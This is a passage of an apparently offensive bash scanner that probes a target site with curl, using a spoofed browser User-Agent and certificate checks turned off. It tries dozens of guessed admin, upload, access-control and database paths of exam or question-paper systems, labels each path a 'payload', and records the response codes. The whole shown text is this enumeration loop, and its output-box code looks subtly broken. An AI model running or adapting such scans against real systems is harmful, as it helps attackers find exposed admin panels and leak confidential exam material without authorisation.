         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPBData/"]: "
